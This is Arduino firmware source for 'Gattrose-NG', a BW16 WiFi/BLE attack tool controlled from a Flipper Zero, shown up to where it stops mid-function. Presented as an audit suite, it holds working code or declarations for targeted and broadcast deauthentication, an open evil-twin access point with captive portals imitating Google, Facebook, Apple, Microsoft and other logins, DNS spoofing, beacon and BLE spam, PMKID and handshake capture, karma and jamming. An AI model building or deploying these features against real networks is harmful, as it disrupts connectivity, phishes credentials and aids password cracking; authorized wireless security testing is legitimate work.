/*
 * Gattrose-NG BW16 Firmware v4.0
 *
 * Full WiFi audit suite:
 * NEW in v4.0: PMKID capture, handshake capture, karma attack, probe logger,
 *              WiFi jammer, rogue AP detector, enhanced BLE spam (FastPair/SwiftPair/AirTag)
 *
 * Original features (KinimodD + Gattrose):
 * - WiFi scanning (2.4GHz + 5GHz)
 * - Deauthentication (broadcast + targeted)
 * - Client detection via promiscuous mode
 * - Beacon flooding (random, rickroll, custom)
 * - Evil Twin AP with captive portals
 * - DNS spoofing
 * - BLE scanning and spam
 * - STX/ETX protocol for Flipper Zero compatibility
 *
 * Pin connections:
 *   BW16 TX1 (PA14) -> Flipper RX (pin 14)
 *   BW16 RX1 (PA13) -> Flipper TX (pin 13)
 *   BW16 GND -> Flipper GND
 *   BW16 5V -> Flipper 5V (recommended over 3.3V)
 */

#include "Arduino.h"

// Fix max/min macro conflicts with STL
#undef max
#undef min

#include "vector"
#include "map"
#include "WiFi.h"
#include "WiFiServer.h"
#include "WiFiClient.h"
#include "wifi_conf.h"
#include "wifi_cust_tx.h"
#include "wifi_util.h"
#include "wifi_drv.h"
#include "wifi_structures.h"
// BLE support re-enabled
#include "BLEDevice.h"
#include "BLEAdvertData.h"
// #define NO_BLE_TEST 1  // Uncomment to disable BLE

#include "dns.h"
#include "debug.h"

// SDK 3.0.8 compatibility - LED pin names differ between SDK versions
#ifndef LED_R
  #define LED_R LED_BUILTIN_R
#endif
#ifndef LED_G
  #define LED_G LED_BUILTIN_G
#endif
#ifndef LED_B
  #define LED_B LED_BUILTIN_B
#endif
#include "portals/default.h"
#include "portals/google.h"
#include "portals/facebook.h"
#include "portals/amazon.h"
#include "portals/apple.h"
#include "portals/netflix.h"
#include "portals/microsoft.h"

// ============== Configuration ==============
#define SERIAL_BAUD 115200
#define MAX_NETWORKS 50
#define MAX_CLIENTS 100
#define MAX_CLIENTS_PER_AP 20
#define MAX_DEAUTH_TASKS 5
#define FRAMES_PER_DEAUTH 5

// ============== Protocol Markers ==============
#define STX 0x02  // Start of text
#define ETX 0x03  // End of text
#define SEP 0x1D  // Field separator

// ============== Scan Callback Buffer ==============
// Fixed-size buffer for scan results - NO dynamic allocation in callback!
typedef struct {
    char ssid[33];        // SSID max 32 chars + null
    uint8_t bssid[6];
    int16_t rssi;
    uint8_t channel;
    uint32_t security;
} ScanResultRaw;

#define MAX_SCAN_BUFFER 50
static ScanResultRaw g_scanBuffer[MAX_SCAN_BUFFER];
static volatile int g_scanCount = 0;
static volatile bool g_scanComplete = false;

// ============== LED Pins ==============
// Red: System ready
// Green: Communication/scanning
// Blue: Attack active

// ============== Data Structures ==============
typedef struct {
    String ssid;
    String bssid_str;
    uint8_t bssid[6];
    int16_t rssi;
    uint8_t channel;
    uint32_t security;
    bool is_5ghz;
    bool has_pmf;        // Protected Management Frames - can't deauth
    bool hidden;         // Hidden/empty SSID
    int client_count;
    uint8_t clients[MAX_CLIENTS_PER_AP][6];
    int8_t client_rssi[MAX_CLIENTS_PER_AP];
} WiFiNetwork;

typedef struct {
    uint8_t mac[6];
    String mac_str;
    int8_t rssi;
    int ap_index;
    unsigned long last_seen;
} WiFiClient_t;

typedef struct {
    TaskHandle_t handle;
    int* network_index;
    int reason;
    uint8_t* target_client;  // NULL for broadcast
} DeauthTask;

typedef struct {
    String name;
    String address;
    int rssi;
    int rssi_min;           // Track RSSI range for distance estimation
    int rssi_max;
    unsigned long first_seen;
    unsigned long last_seen;
    uint16_t seen_count;    // Number of times seen
    bool is_tracking;       // Currently being tracked (seen recently)
} BLEDevice_t;

// ============== Portal Types ==============
enum PortalType {
    PORTAL_DEFAULT = 0,
    PORTAL_GOOGLE,
    PORTAL_FACEBOOK,
    PORTAL_AMAZON,
    PORTAL_APPLE,
    PORTAL_NETFLIX,
    PORTAL_MICROSOFT,
    PORTAL_WAIT
};

// ============== Probe Log Entry ==============
typedef struct {
    char ssid[33];
    uint8_t client_mac[6];
    int8_t rssi;
    unsigned long timestamp;
} ProbeLogEntry;

// ============== PMKID Entry ==============
typedef struct {
    uint8_t pmkid[16];
    uint8_t ap_mac[6];
    uint8_t client_mac[6];
    char ssid[33];
    bool valid;
} PMKIDEntry;

// ============== Handshake Entry ==============
typedef struct {
    uint8_t ap_mac[6];
    uint8_t client_mac[6];
    char ssid[33];
    uint8_t anonce[32];
    uint8_t snonce[32];
    uint8_t mic[16];
    uint8_t eapol_frame[256];
    uint16_t eapol_len;
    uint8_t msg_mask;  // Bits: msg1=0x01, msg2=0x02, msg3=0x04, msg4=0x08
    bool complete;
} HandshakeEntry;

// ============== Global State ==============
std::vector<WiFiNetwork> networks;
std::vector<WiFiClient_t> clients;
std::vector<BLEDevice_t> ble_devices;
std::vector<ProbeLogEntry> probeLog;
std::vector<PMKIDEntry> pmkidList;
std::vector<HandshakeEntry> handshakeList;

// Feature flags
bool probeLogActive = false;
bool pmkidCaptureActive = false;
bool handshakeCaptureActive = false;
bool karmaActive = false;
bool jammerActive = false;
bool rogueDetectorActive = false;

// ============== Rogue AP Baseline Entry ==============
typedef struct {
    uint8_t bssid[6];
    char ssid[33];
    uint8_t channel;
} BaselineAP;

std::vector<BaselineAP> apBaseline;

// Task handles
TaskHandle_t scanTask = NULL;
TaskHandle_t wifiServerTask = NULL;
TaskHandle_t clientHandlerTask = NULL;
TaskHandle_t beaconFloodTask = NULL;
TaskHandle_t customBeaconTask = NULL;
TaskHandle_t bleSpamTask = NULL;
TaskHandle_t promiscTask = NULL;

DeauthTask deauthTasks[MAX_DEAUTH_TASKS];
int deauthTaskCount = 0;

// WiFi AP settings
char* ap_ssid = "Free_WiFi";
char* ap_pass = "";  // Empty = open AP (more compatible)
int current_channel = 6;

// Server
WiFiServer server(80);
PortalType currentPortal = PORTAL_DEFAULT;

// Protocol buffer (Serial1 - Flipper)
const byte MAX_CMD_LEN = 64;
byte cmdBuffer[MAX_CMD_LEN];
byte cmdLen = 0;
bool cmdReady = false;

// Protocol buffer (Serial - USB debug)
byte usbCmdBuffer[MAX_CMD_LEN];
byte usbCmdLen = 0;
bool usbCmdReady = false;

// LED Rainbow state
TaskHandle_t ledTask = NULL;
volatile uint8_t ledMode = 0;  // 0=off, 1=wifi scan rainbow, 2=ble scan rainbow, 3=attack pulse
volatile bool ledRunning = false;

// Beacon settings
bool randomBeaconActive = false;
bool rickrollBeaconActive = false;
bool customBeaconActive = false;
String customBeaconSSID = "";

// BLE settings
bool bleScanActive = false;
bool bleSpamActive = false;
uint8_t bleSpamType = 0;  // 0=random, 1=FastPair(Android), 2=SwiftPair(Windows), 3=AirTag, 4=all

// Client detection
bool promiscActive = false;
TaskHandle_t channelHopTask = NULL;
int currentPromiscChannel = 1;
unsigned long lastFrameCount = 0;
unsigned long frameCount = 0;

// Frame capture counters (for debug)
unsigned long dataFrameCount = 0;
unsigned long unmatchedBssidCount = 0;
unsigned long lastDebugPrint = 0;
unsigned long probeCount = 0;
unsigned long assocCount = 0;
unsigned long authCount = 0;

// Evil Twin state
volatile bool evilTwinActive = false;

// Deauth TX from main loop (SDK limitation)
volatile bool doDeauthTx = false;
int deauthTargetIdx = -1;

// Rickroll SSIDs
const char* rickroll_ssids[] = {
    "01 Never gonna give you up",
    "02 Never gonna let you down",
    "03 Never gonna run around",
    "04 and desert you",
    "05 Never gonna make you cry",
    "06 Never gonna say goodbye",
    "07 Never gonna tell a lie",
    "08 and hurt you"
};

// Channel arrays
int channels_2g[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11};
int channels_5g[] = {36, 40, 44, 48, 149, 153, 157, 161};

// ============== Forward Declarations ==============
void processCommand();
void sendResponse(char type, String data);
void sendNetworkList();
void sendClientList();
void sendBLEList();

// WiFi functions
void scanNetworksTask(void* params);
void startDeauth(int index, int reason, uint8_t* targetClient);
void stopAllDeauth();
void deauthTask(void* params);

// Beacon functions
void beaconFloodTaskFunc(void* params);
void customBeaconTaskFunc(void* params);
void startBeaconFlood(int mode);
void startCustomBeacon(String ssid);
void stopBeaconFlood();

// Evil twin functions
void startEvilTwin(PortalType portal);
void stopEvilTwin();
void clientHandlerTaskFunc(void* params);
void handleHTTPRequest(WiFiClient& client, String& request);

// BLE functions
void startBLEScan();
void stopBLEScan();
void startBLESpam();
void stopBLESpam();
void bleSpamTaskFunc(void* params);

// Client detection
void startPromisc();
void stopPromisc();
void promiscCallback(unsigned char* buf, unsigned int len, void* userdata);
void processManagementFrame(uint8_t* frame, int len, int rssi, uint8_t subtype);
void processDataFrame(uint8_t* frame, int len, int rssi, uint8_t* bssidFromInfo);

// Utility
String macToString(uint8_t* mac);
void stringToMac(String str, uint8_t* mac);
String getSecurityString(uint32_t security);
String generateRandomString(int len);
uint32_t stringHash(const String& str);
void sortNetworks();
bool hasPMF(uint32_t security);

// LED functions
void startLedEffect(uint8_t mode);
void stopLedEffect();
void ledTaskFunc(void* params);
void setRGB(uint8_t r, uint8_t g, uint8_t b);
void hsvToRgb(float h, float s, float v, uint8_t* r, uint8_t* g, uint8_t* b);
void playMorseBootSequence();

// Client-only attack
void startClientDeauth(uint8_t* clientMac, int reason);
void cmd_client_attack(char* args);
void cmd_led(char* args);

// New attack features
void cmd_probe_log(char* args);
void cmd_pmkid(char* args);
void cmd_handshake(char* args);
void cmd_karma(char* args);
void cmd_jammer(char* args);
void cmd_rogue_detector(char* args);
void checkForRogueAPs();
void sendProbeLog();
void sendPMKIDList();
void sendHandshakeList();
void processEAPOL(uint8_t* frame, int len, int rssi);
void jammerTaskFunc(void* params);

// ============== Setup ==============
void setup() {
    // Initialize serial FIRST for debug
    Serial.begin(SERIAL_BAUD);   // Debug
    delay(100);
    Serial.println("*** BOOT ***");
    Serial.flush();

    Serial1.begin(SERIAL_BAUD);  // Flipper communication

    // Initialize LEDs (active HIGH - LOW = off)
    pinMode(LED_R, OUTPUT);
    pinMode(LED_G, OUTPUT);
    pinMode(LED_B, OUTPUT);
    digitalWrite(LED_R, LOW);
    digitalWrite(LED_G, LOW);
    digitalWrite(LED_B, LOW);

    Serial.println("LEDs init");
    Serial.flush();

    // Initialize WiFi via Arduino API
    Serial.println("WiFi init...");
    Serial.flush();
    WiFi.status();  // This triggers proper initialization
    delay(1000);
    Serial.println("WiFi done");
    Serial.flush();

    // Play morse code boot sequence
    playMorseBootSequence();

    // DON'T start promisc at boot - it blocks wifi_scan_networks!
    // Promisc will auto-start after first scan completes
    Serial.println("Ready for scan (promisc starts after scan)");
    Serial.flush();

    // Signal ready - solid green (LEDs are active HIGH)
    digitalWrite(LED_G, HIGH);   // On

    Serial.println("Gattrose-NG v4.0 Ready");
    Serial.flush();
    sendResponse('r', "GATTROSE-NG:4.0");
}

// ============== Main Loop ==============
void loop() {
    // Read commands from Flipper (Serial1)
    while (Serial1.available() > 0) {
        byte b = Serial1.read();

        if (b == STX) {
            cmdLen = 0;
            cmdReady = false;
        } else if (b == ETX) {
            cmdBuffer[cmdLen] = '\0';
            cmdReady = true;
        } else if (cmdLen < MAX_CMD_LEN - 1) {
            cmdBuffer[cmdLen++] = b;
        }
    }

    // Also read from USB Serial (for testing without Flipper)
    while (Serial.available() > 0) {
        byte b = Serial.read();

        if (b == STX) {
            usbCmdLen = 0;
            usbCmdReady = false;
        } else if (b == ETX) {
            usbCmdBuffer[usbCmdLen] = '\0';
            usbCmdReady = true;
        } else if (usbCmdLen < MAX_CMD_LEN - 1) {
            usbCmdBuffer[usbCmdLen++] = b;
        }
    }

    if (cmdReady) {
        processCommand();
        cmdReady = false;
    }

    if (usbCmdReady) {
        // Copy USB command to main buffer and process
        memcpy(cmdBuffer, usbCmdBuffer, usbCmdLen + 1);
        cmdLen = usbCmdLen;
        processCommand();
        usbCmdReady = false;
    }

    // Do deauth TX in main loop context (not task)
    doDeauthInMainLoop();

    delay(10);
}

// ============== Command Processing ==============
void processCommand() {
    if (cmdLen == 0) return;

    char cmd = cmdBuffer[0];
    char* args = (char*)&cmdBuffer[1];

    DEBUG_SER_PRINT("CMD: ");
    DEBUG_SER_PRINT(cmd);
    DEBUG_SER_PRINT(" Args: ");
    DEBUG_SER_PRINTLN(args);

    switch (cmd) {
        case 's': // Scan networks
            cmd_scan(args);
            break;

        case 'g': // Get network list
            sendNetworkList();
            break;

        case 'c': // Get client list
            sendClientList();
            break;

        case 'd': // Deauth
            cmd_deauth(args);
            break;

        case 'w': // WiFi AP (evil twin)
            cmd_wifi(args);
            break;

        case 'p': // Change portal
            cmd_portal(args);
            break;

        case 'b': // Beacon flood
            cmd_beacon(args);
            break;

        case 'l': // BLE commands
            cmd_ble(args);
            break;

        case 'm': // Monitor mode (client detection)
            cmd_monitor(args);
            break;

        case 'a': // AP settings
            cmd_ap_settings(args);
            break;

        case 'i': // Info/status
            cmd_info();
            break;

        case 'x': // Stop all
            cmd_stop_all();
            break;

        case 'k': // Client-only attack (k<mac>[-reason])
            cmd_client_attack(args);
            break;

        case 'r': // RGB LED control (r<R>,<G>,<B> or r0 for off, r1-3 for effects)
            cmd_led(args);
            break;

        case 'P': // Probe logger (P0=off, P1=on, Pg=get)
            cmd_probe_log(args);
            break;

        case 'h': // PMKID capture (h0=off, h1=on, hg=get)
            cmd_pmkid(args);
            break;

        case 'H': // Handshake capture (H0=off, H1=on, Hg=get)
            cmd_handshake(args);
            break;

        case 'K': // Karma attack (K0=off, K1=on)
            cmd_karma(args);
            break;

        case 'J': // WiFi Jammer (J0=off, J1=on)
            cmd_jammer(args);
            break;

        case 'R': // Rogue AP Detector (R0=off, R1=set baseline, R2=start monitoring)
            cmd_rogue_detector(args);
            break;

        default:
            DEBUG_SER_PRINTLN("Unknown command");
            break;
    }
}

// ============== Command Handlers ==============

void cmd_scan(char* args) {
    int scanTime = 5000;
    if (strlen(args) > 0) {
        scanTime = atoi(args);
        if (scanTime < 1000) scanTime = 1000;
        if (scanTime > 30000) scanTime = 30000;
    }

    // Run scan in background task for proper callback processing
    if (scanTask == NULL) {
        sendResponse('s', "SCANNING");
        int* timeParam = new int(scanTime);
        xTaskCreate(scanNetworksTask, "scan", 4096, timeParam, 1, &scanTask);
    } else {
        sendResponse('e', "SCAN_BUSY");
    }
}

void cmd_deauth(char* args) {
    DEBUG_SER_PRINTLN("cmd_deauth entered");
    Serial.flush();

    // Skip separator if present
    if (args[0] == SEP) args++;

    DEBUG_SER_PRINT("args: ");
    DEBUG_SER_PRINTLN(args);
    Serial.flush();

    if (args[0] == 's') {
        // Stop all deauth
        DEBUG_SER_PRINTLN("Stopping all deauth");
        stopAllDeauth();
        sendResponse('d', "STOPPED");
    } else {
        // Parse: <index>[-<reason>][-<client_mac>]
        int index = 0;
        int reason = 2;  // Default reason
        uint8_t* targetClient = NULL;
        uint8_t clientMac[6];

        // Parse index
        char* dash = strchr(args, '-');
        if (dash) {
            *dash = '\0';
            index = atoi(args);
            reason = atoi(dash + 1);
        } else {
            index = atoi(args);
        }

        DEBUG_SER_PRINT("Parsed index: ");
        DEBUG_SER_PRINT(index);
        DEBUG_SER_PRINT(" networks.size: ");
        DEBUG_SER_PRINTLN(networks.size());
        Serial.flush();

        if (index >= 0 && index < (int)networks.size()) {
            DEBUG_SER_PRINTLN("Calling startDeauth");
            Serial.flush();
            startDeauth(index, reason, targetClient);
            DEBUG_SER_PRINTLN("startDeauth returned");
            Serial.flush();
            sendResponse('d', "DEAUTH:" + String(index));
        } else {
            sendResponse('e', "INVALID_INDEX");
        }
    }
}

void cmd_wifi(char* args) {
    if (args[0] == SEP) args++;
    if (args[0] == '0') {
        stopEvilTwin();
        sendResponse('w', "AP_OFF");
    } else {
        PortalType portal = PORTAL_DEFAULT;
        switch (args[0]) {
            case '1': portal = PORTAL_DEFAULT; break;
            case '2': portal = PORTAL_GOOGLE; break;
            case '3': portal = PORTAL_FACEBOOK; break;
            case '4': portal = PORTAL_AMAZON; break;
            case '5': portal = PORTAL_APPLE; break;
            case '6': portal = PORTAL_NETFLIX; break;
            case '7': portal = PORTAL_MICROSOFT; break;
        }
        startEvilTwin(portal);
        sendResponse('w', "AP_ON:" + String(args[0]));
    }
}

void cmd_portal(char* args) {
    if (args[0] == SEP) args++;
    int portalNum = atoi(args);
    if (portalNum >= 0 && portalNum <= 7) {
        currentPortal = (PortalType)portalNum;
        sendResponse('p', "PORTAL:" + String(portalNum));
    }
}

void cmd_beacon(char* args) {
    if (args[0] == SEP) args++;
    if (args[0] == 's') {
        stopBeaconFlood();
        sendResponse('b', "BEACON_STOP");
    } else if (args[0] == 'r') {
        startBeaconFlood(1);  // Random
        sendResponse('b', "BEACON_RANDOM");
    } else if (args[0] == 'k') {
        startBeaconFlood(2);  // Rickroll
        sendResponse('b', "BEACON_RICKROLL");
    } else if (args[0] == 'c') {
        String ssid = String(args + 1);
        startCustomBeacon(ssid);
        sendResponse('b', "BEACON_CUSTOM:" + ssid);
    }
}

void cmd_ble(char* args) {
    if (args[0] == SEP) args++;
    if (args[0] == 's') {
        // Scan
        startBLEScan();
        sendResponse('l', "BLE_SCANNING");
    } else if (args[0] == 'g') {
        // Get BLE devices
        sendBLEList();
    } else if (args[0] == 'p') {
        // Spam with optional type: lp0=random, lp1=FastPair, lp2=SwiftPair, lp3=AirTag, lp4=all
        if (args[1] >= '0' && args[1] <= '4') {
            bleSpamType = args[1] - '0';
        } else {
            bleSpamType = 4;  // Default to 'all' for maximum chaos
        }
        const char* typeNames[] = {"RANDOM", "FASTPAIR", "SWIFTPAIR", "AIRTAG", "ALL"};
        startBLESpam();
        sendResponse('l', String("BLE_SPAM_") + typeNames[bleSpamType]);
    } else if (args[0] == 'x') {
        // Stop
        stopBLEScan();
        stopBLESpam();
        sendResponse('l', "BLE_STOP");
    }
}

void cmd_monitor(char* args) {
    // Skip separator if present
    if (args[0] == SEP) args++;

    if (args[0] == '1') {
        startPromisc();
        sendResponse('m', "MONITOR_ON");
    } else {
        stopPromisc();
        sendResponse('m', "MONITOR_OFF");
    }
}

void cmd_ap_settings(char* args) {
    if (args[0] == SEP) args++;
    // Format: a<ssid>|<password>|<channel>
    String settings = String(args);
    int sep1 = settings.indexOf('|');
    int sep2 = settings.indexOf('|', sep1 + 1);

    if (sep1 > 0) {
        String newSSID = settings.substring(0, sep1);
        newSSID.toCharArray(ap_ssid, 33);

        if (sep2 > sep1) {
            String newPass = settings.substring(sep1 + 1, sep2);
            newPass.toCharArray(ap_pass, 65);
            current_channel = settings.substring(sep2 + 1).toInt();
        }
    }
    sendResponse('a', "AP_CONFIG_SET");
}

void cmd_info() {
    String info = "V:4.0|N:" + String(networks.size()) +
                  "|C:" + String(clients.size()) +
                  "|CH:" + String(current_channel) +
                  "|D:" + String(deauthTaskCount) +
                  "|B:" + String(beaconFloodTask != NULL ? 1 : 0) +
                  "|W:" + String(wifiServerTask != NULL ? 1 : 0) +
                  "|BLE:" + String(ble_devices.size());
    sendResponse('i', info);
}

void cmd_stop_all() {
    stopAllDeauth();
    stopBeaconFlood();
    stopEvilTwin();
    stopBLEScan();
    stopBLESpam();
    stopPromisc();
    stopLedEffect();

    // All LEDs off (active HIGH: LOW = off)
    digitalWrite(LED_R, LOW);
    digitalWrite(LED_G, LOW);
    digitalWrite(LED_B, LOW);

    sendResponse('x', "ALL_STOPPED");
}

void cmd_client_attack(char* args) {
    if (args[0] == SEP) args++;
    // Format: k<mac>[-reason]
    // Example: kAA:BB:CC:DD:EE:FF or kAA:BB:CC:DD:EE:FF-7
    if (strlen(args) < 17) {
        sendResponse('e', "INVALID_MAC");
        return;
    }

    uint8_t clientMac[6];
    int reason = 2;  // Default

    char* dash = strchr(args, '-');
    if (dash) {
        *dash = '\0';
        reason = atoi(dash + 1);
    }

    stringToMac(String(args), clientMac);
    startClientDeauth(clientMac, reason);
    sendResponse('k', "CLIENT_DEAUTH:" + String(args));
}

void cmd_led(char* args) {
    if (args[0] == SEP) args++;
    // Format options:
    // r0 = off
    // r1 = WiFi scan effect (cyan-blue-green)
    // r2 = BLE scan effect (purple-magenta)
    // r3 = Attack effect (red-orange)
    // r<R>,<G>,<B> = static color (e.g., r255,0,128)

    if (strlen(args) == 0) {
        sendResponse('e', "LED_NO_ARGS");
        return;
    }

    // Check for effect modes (single digit)
    if (strlen(args) == 1 && args[0] >= '0' && args[0] <= '3') {
        int mode = args[0] - '0';
        if (mode == 0) {
            stopLedEffect();
            sendResponse('r', "LED_OFF");
        } else {
            startLedEffect(mode);
            sendResponse('r', "LED_EFFECT:" + String(mode));
        }
        return;
    }

    // Parse R,G,B values
    int r = 0, g = 0, b = 0;
    char* token = strtok(args, ",");
    if (token) r = atoi(token);
    token = strtok(NULL, ",");
    if (token) g = atoi(token);
    token = strtok(NULL, ",");
    if (token) b = atoi(token);

    // Clamp values
    r = constrain(r, 0, 255);
    g = constrain(g, 0, 255);
    b = constrain(b, 0, 255);

    // Stop any running effect
    stopLedEffect();

    // Set static color
    setRGB(r, g, b);
    sendResponse('r', "LED:" + String(r) + "," + String(g) + "," + String(b));
}

// ============== Response Functions ==============

void sendResponse(char type, String data) {
    // Send to Flipper (Serial1)
    Serial1.write(STX);
    Serial1.write(type);
    Serial1.print(data);
    Serial1.write(ETX);
    Serial1.flush();

    // Also echo to USB Serial for testing
    Serial.write(STX);
    Serial.write(type);
    Serial.print(data);
    Serial.write(ETX);
    Serial.flush();
}

void sendNetworkList() {
    // Send count first
    sendResponse('i', String(networks.size()));

    // Send each network
    // Format: index|ssid|bssid|channel|rssi|band|clients|security|pmf|hidden
    // NOTE: Empty SSIDs sent as "*hidden*" to avoid strtok parsing issues
    for (size_t i = 0; i < networks.size(); i++) {
        WiFiNetwork& net = networks[i];
        // Use "*hidden*" for empty SSIDs - strtok skips empty tokens!
        String ssid_str = (net.ssid.length() > 0) ? net.ssid : "*hidden*";
        String data = String(i) + String((char)SEP) +
                      ssid_str + String((char)SEP) +
                      net.bssid_str + String((char)SEP) +
                      String(net.channel) + String((char)SEP) +
                      String(net.rssi) + String((char)SEP) +
                      (net.is_5ghz ? "5" : "2") + String((char)SEP) +
                      String(net.client_count) + String((char)SEP) +
                      getSecurityString(net.security) + String((char)SEP) +
                      (net.has_pmf ? "1" : "0") + String((char)SEP) +
                      (net.hidden ? "1" : "0");
        sendResponse('n', data);
    }

    // Check for rogue APs if monitoring is active
    checkForRogueAPs();
}

void sendClientList() {
    sendResponse('i', String(clients.size()));

    for (size_t i = 0; i < clients.size(); i++) {
        WiFiClient_t& cli = clients[i];
        String data = String(cli.ap_index) + String((char)SEP) +
                      cli.mac_str + String((char)SEP) +
                      String(cli.rssi);
        sendResponse('c', data);
    }
}

void sendBLEList() {
    sendResponse('i', String(ble_devices.size()));

    unsigned long now = millis();

    // Mark devices as not tracking if not seen for 30 seconds
    for (size_t i = 0; i < ble_devices.size(); i++) {
        if (now - ble_devices[i].last_seen > 30000) {
            ble_devices[i].is_tracking = false;
        }
    }

    // Format: address|name|rssi|rssi_min|rssi_max|seen_count|first_seen_ago_sec|last_seen_ago_sec|tracking
    for (size_t i = 0; i < ble_devices.size(); i++) {
        BLEDevice_t& dev = ble_devices[i];
        unsigned long first_ago = (now - dev.first_seen) / 1000;  // Seconds ago
        unsigned long last_ago = (now - dev.last_seen) / 1000;
        String data = dev.address + String((char)SEP) +
                      dev.name + String((char)SEP) +
                      String(dev.rssi) + String((char)SEP) +
                      String(dev.rssi_min) + String((char)SEP) +
                      String(dev.rssi_max) + String((char)SEP) +
                      String(dev.seen_count) + String((char)SEP) +
                      String(first_ago) + String((char)SEP) +
                      String(last_ago) + String((char)SEP) +
                      (dev.is_tracking ? "1" : "0");
        sendResponse('l', data);
    }
}

// ============== WiFi Scanning ==============

// Scan callback - uses fixed buffer, NO dynamic allocation
rtw_result_t scanBufferCallback(rtw_scan_handler_result_t* result) {
    if (result->scan_complete == RTW_TRUE) {
        g_scanComplete = true;
    } else if (g_scanCount < MAX_SCAN_BUFFER) {
        rtw_scan_result_t* record = &result->ap_details;
        ScanResultRaw* entry = &g_scanBuffer[g_scanCount];

        // Copy SSID (fixed-size, no String)
        int len = record->SSID.len;
        if (len > 32) len = 32;
        memcpy(entry->ssid, record->SSID.val, len);
        entry->ssid[len] = 0;

        // Copy other fields
        memcpy(entry->bssid, record->BSSID.octet, 6);
        entry->rssi = record->signal_strength;
        entry->channel = record->channel;
        entry->security = record->security;

        g_scanCount++;
    }
    return RTW_SUCCESS;
}

// Scan result handler - updates existing networks with BSSID/channel
rtw_result_t scanResultHandler(rtw_scan_handler_result_t* malloced_scan_result) {
    rtw_scan_result_t* record;

    if (malloced_scan_result->scan_complete != RTW_TRUE) {
        record = &malloced_scan_result->ap_details;
        record->SSID.val[record->SSID.len] = 0;
        String ssid = String((const char*)record->SSID.val);

        // Try to find and update existing network by SSID
        bool found = false;
        for (size_t i = 0; i < networks.size(); i++) {
            if (networks[i].ssid == ssid && networks[i].bssid[0] == 0) {
                // Update with BSSID and channel info
                memcpy(networks[i].bssid, record->BSSID.octet, 6);
                networks[i].bssid_str = macToString(networks[i].bssid);
                networks[i].channel = record->channel;
                networks[i].is_5ghz = (record->channel >= 36);
                found = true;
                break;
            }
        }

        // If not found and we have space, add as new
        if (!found && networks.size() < MAX_NETWORKS) {
            WiFiNetwork net;
            net.ssid = ssid;
            net.channel = record->channel;
            net.rssi = record->signal_strength;
            net.security = record->security;
            net.is_5ghz = (record->channel >= 36);
            net.client_count = 0;
            net.has_pmf = hasPMF(record->security);
            net.hidden = (ssid.length() == 0);
            memcpy(net.bssid, record->BSSID.octet, 6);
            net.bssid_str = macToString(net.bssid);
            networks.push_back(net);
        }
    }

    return RTW_SUCCESS;
}

void scanNetworksTask(void* params) {
    int scanTime = 5000;
    if (params) {
        scanTime = *((int*)params);
        delete (int*)params;
    }

    digitalWrite(LED_B, HIGH); // Blue = scanning

    // CRITICAL: Stop promiscuous mode before scanning - it blocks wifi_scan_networks!
    bool wasPromisc = promiscActive;
    if (promiscActive) {
        DEBUG_SER_PRINTLN("Stopping promisc for scan...");
        stopPromisc();
        vTaskDelay(500 / portTICK_PERIOD_MS);
    }

    networks.clear();
    clients.clear();

    // Reset scan buffer
    g_scanCount = 0;
    g_scanComplete = false;
    memset(g_scanBuffer, 0, sizeof(g_scanBuffer));

    DEBUG_SER_PRINTLN("Calling wifi_scan_networks...");
    Serial.flush();

    int ret = wifi_scan_networks(scanBufferCallback, NULL);

    DEBUG_SER_PRINT("Scan returned: ");
    DEBUG_SER_PRINTLN(ret);

    // Poll for scan results like Arduino WiFi API does
    int attempts = 10;
    do {
        vTaskDelay(2000 / portTICK_PERIOD_MS);
        DEBUG_SER_PRINT(".");
    } while (g_scanCount == 0 && --attempts > 0);

    DEBUG_SER_PRINTLN("");
    DEBUG_SER_PRINT("Callback count: ");
    DEBUG_SER_PRINTLN(g_scanCount);

    // Process scan buffer - convert raw results to WiFiNetwork objects
    // This runs in task context, so String/vector operations are safe
    for (int i = 0; i < g_scanCount && i < MAX_SCAN_BUFFER; i++) {
        ScanResultRaw* raw = &g_scanBuffer[i];

        WiFiNetwork net;
        net.ssid = String(raw->ssid);
        net.channel = raw->channel;
        net.rssi = raw->rssi;
        net.security = raw->security;
        net.is_5ghz = (raw->channel >= 36);
        net.client_count = 0;
        net.has_pmf = hasPMF(raw->security);
        net.hidden = (raw->ssid[0] == 0);
        memcpy(net.bssid, raw->bssid, 6);
        net.bssid_str = macToString(net.bssid);

        networks.push_back(net);
    }

    digitalWrite(LED_B, LOW);   // LED off

    // Sort networks: named first, then by signal strength
    sortNetworks();

    DEBUG_SER_PRINT("Found ");
    DEBUG_SER_PRINT(networks.size());
    DEBUG_SER_PRINTLN(" networks");

    // Count PMF networks
    int pmfCount = 0;
    int hiddenCount = 0;
    for (size_t i = 0; i < networks.size(); i++) {
        if (networks[i].has_pmf) pmfCount++;
        if (networks[i].hidden) hiddenCount++;
    }
    DEBUG_SER_PRINT("PMF protected: ");
    DEBUG_SER_PRINTLN(pmfCount);
    DEBUG_SER_PRINT("Hidden: ");
    DEBUG_SER_PRINTLN(hiddenCount);

    // Auto-enable promiscuous mode to detect clients
    DEBUG_SER_PRINTLN("Auto-starting client detection...");
    startPromisc();

    digitalWrite(LED_G, HIGH);  // Green on = ready
    sendResponse('s', "DONE:" + String(networks.size()));

    scanTask = NULL;
    vTaskDelete(NULL);
}

// ============== Deauthentication ==============

void startDeauth(int index, int reason, uint8_t* targetClient) {
    DEBUG_SER_PRINTLN("startDeauth entered");
    Serial.flush();

    if (deauthTaskCount >= MAX_DEAUTH_TASKS) {
        sendResponse('e', "MAX_DEAUTH_TASKS");
        return;
    }

    // Check if already deauthing this network
    for (int i = 0; i < deauthTaskCount; i++) {
        if (deauthTasks[i].network_index && *deauthTasks[i].network_index == index) {
            sendResponse('e', "ALREADY_DEAUTHING");
            return;
        }
    }

    // Try NOT stopping promisc - maybe TX works with it active
    // if (promiscActive) {
    //     DEBUG_SER_PRINTLN("Stopping promisc for deauth...");
    //     stopPromisc();
    //     vTaskDelay(200 / portTICK_PERIOD_MS);
    // }

    DEBUG_SER_PRINTLN("Creating deauth task");
    Serial.flush();

    DeauthTask* task = &deauthTasks[deauthTaskCount];
    task->network_index = new int(index);
    task->reason = reason;

    if (targetClient) {
        task->target_client = new uint8_t[6];
        memcpy(task->target_client, targetClient, 6);
    } else {
        task->target_client = NULL;
    }

    DEBUG_SER_PRINTLN("Starting xTaskCreate");
    Serial.flush();

    xTaskCreate(deauthTask, "deauth", 2048, (void*)task, 1, &task->handle);
    deauthTaskCount++;

    DEBUG_SER_PRINTLN("Task created");
    Serial.flush();

    // Enable main loop TX
    deauthTargetIdx = index;
    doDeauthTx = true;

    // Red LED on during deauth
    stopLedEffect();
    digitalWrite(LED_R, HIGH);
    digitalWrite(LED_G, LOW);
    digitalWrite(LED_B, LOW);

